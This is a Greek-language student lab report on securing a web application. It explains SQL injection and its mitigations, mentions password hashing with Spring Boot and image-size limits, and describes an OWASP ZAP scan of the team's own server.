Περιορίσαμε το μέγεθος byte size της εικόνας profile που μπορεί να βάλει ένας χρήστης, ώστε να μην μπορεί να μπει εσκεμένα μεγαλύτερο


SQL Injection (SQLi) Attack:
Περιγραφή: Η επίθεση SQL Injection (SQLi) εκμεταλλεύεται αδυναμίες στην επεξεργασία SQL ερωτημάτων από το σύστημα βάσης δεδομένων. Ο επιτιθέμενος εισάγει κακόβουλες εντολές SQL, εκτελώντας τις από τη βάση δεδομένων.
Πώς Λειτουργεί: Ο επιτιθέμενος εισάγει SQL εντολές μέσα σε είσοδο που αναμένεται να εκτελεστεί από τη βάση δεδομένων. Εάν οι εισόδοι δεν φιλτραριστούν σωστά, οι κακόβουλες εντολές SQL εκτελούνται.
Λύσεις:
Χρήση Προετοιμασμένων Δηλώσεων (Prepared Statements): Χρησιμοποίησε προετοιμασμένες δηλώσεις ή παραμετροποιημένα ερωτήματα για την αποφυγή της εκτέλεσης κακόβουλου κώδικα.
Έλεγχος Εισόδου: Επικύρωσε και κωδικοποίησε τις εισόδους χρηστών προτού εκτελεστούν στη βάση δεδομένων.
Χρήση ORM (Object-Relational Mapping): Χρησιμοποίησε ένα ORM framework όπως το Hibernate για να αποφύγεις τη χειροκίνητη κατασκευή SQL ερωτημάτων.
Περιορισμός Δικαιωμάτων της Βάσης Δεδομένων: Προσδιόρισε περιορισμένα δικαιώματα πρόσβασης στη βάση δεδομένων για τον λογαριασμό που χρησιμοποιεί η εφαρμογή.


Χρησιμοποιούμε prepared statements για όποια ενέργεια κάνουμε στην βάση μας, για να εμποδίσουμε επιθέσεις injection.




Για να αποτρέψουμε data leaks απο την βάση μας, τα στοιχεία των χρηστών, όπως κωδικοί, είναι hashed και salted στην βάση με την χρήση συνάρτησης
bcryptsha512 μέσω της μεθόδου του springboot passwordEncoder

applicationconfig






Να πραγματοποιείσετε αυτοματοποιημένο έλεγχο για την εύρεση επαθειών ασφάλειας (Σημείωση: αυτό το βήμα αποτελεί θα επέκταση της 6ης άσκησης)

Για την ανίχνευση ευπαθειών, χρησιμοποιήσαμε το owasp zap (Zed Proxy) στο οποίο βάλαμε την IP του machine στο οποίο θέλουμε να κάνουμε vulnerability assessment, έχοντας τον web server οnline, για να έχουμε access στο ίδιο network.



Βλέπουμε ότι το spider, δοκίμασε να κάνει και εγγραφή στην βάση μας και μας επέστρεψε ευπάθειες μικρής βαρυσημότητας. Πράγμα που μας κάνει να βλέπουμε ότι η εφαρμογή των μέτρων ασφαλείας για XSS και SQLi λειτούργησε. Όπως επίσης και άλλων ευπαθειών, όπως path traversal, etc



